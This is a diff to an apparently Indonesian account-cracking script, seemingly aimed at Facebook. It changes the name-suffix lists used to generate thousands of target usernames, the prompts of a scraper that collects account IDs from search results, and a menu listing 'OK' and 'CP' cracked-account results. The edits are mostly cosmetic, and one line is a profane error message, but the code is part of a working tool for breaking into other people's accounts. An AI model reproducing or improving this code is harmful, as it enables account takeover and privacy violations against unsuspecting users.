@@ -1252,10 +1252,10 @@ def lainnya():
 #----------------------[ CRACK USERNAME ]----------------------#
 def crack_nama():
 	nama = []
-	custom = [" iqbal"," kami"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," juven"," der"," rika"," udin"," rayan"," tina"," tiara"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
-	custom2 = [" iqbal"," kami"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," juven"," der"," rika"," udin"," rayan"," tina"," tiara"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
-	cetak(panel(f"    Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 3.000 Username",width=90,padding=(0,2),style=f"bold white"))
-	nam = console.input(f' [+] Masukan Nama : ').split(",")
+	custom = [" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," hendrik"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
+	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","naira ","mancung ","dewi ","josen ","johan ","slot ","sharil ","hendrik ","edo ","ridho ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
+	cetak(panel(f"    Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 5.000 Username",width=90,padding=(0,2),style=f"bold white"))
+	nam = console.input(f' ╰─  Masukan Nama : ').split(",")
 	for ser in nam:		
 		for belakang in custom:
 			id = ser+belakang
@@ -1282,7 +1282,7 @@ def cari_nama(link):
 			else:id.append(bo)
 	link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
 	if(link):
-	  sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz ...");sys.stdout.flush()
+	  sys.stdout.write(f"\r ╰─  Mengumpulkan {len(id)} Idz ...");sys.stdout.flush()
 	  time.sleep(0.0000003)
 	  cari_nama(link)
 	else:
@@ -1362,7 +1362,7 @@ def crack_file():
 		setting()
 #-----------------[ HASIL-CRACK ]-----------------#
 def result():
-	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Hasil OK[/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Hasil CP[/]\n[bold white][[bold green]03[/][bold white]][/] [bold red]Kembali[/]',width=90,title=f"[bold white]• [/][bold green]List Menu Cek[/][bold white] •[/]",style=f"bold cyan"))
+	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Hasil OK[/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Hasil CP[/]\n[bold white][[bold green]03[/][bold white]][/] [bold red]Kembali[/]',width=90,title=f"[bold white]• [/][bold green]List Menu Cek[/][bold white] •[/]",style=f"bold white"))
 	kz = input(f'\n {P}[{x}{H}?{x}{P}]{x} {P}select{x} : ')
 	if kz in ['2','02']:
 		try:vin = os.listdir('CP')
@@ -1410,7 +1410,7 @@ def result():
 	elif kz in ['1','01']:
 		try:vin = os.listdir('OK')
 		except FileNotFoundError:
-			print(' [+] File Tidak Di Temukan ')
+			print(' ╰─  File Tidak Di Temukan ')
 			time.sleep(4)
 			back()
 		if len(vin)==0:
@@ -1456,7 +1456,6 @@ def result():
 	else:
 		print(' ╰─  Pilih Yang Bener Kontol ')
 		exit()
-	
 #-------------------[ CRACK-PUBLIK-MASSAL]----------------#
 def brayen_dump():
 	try:
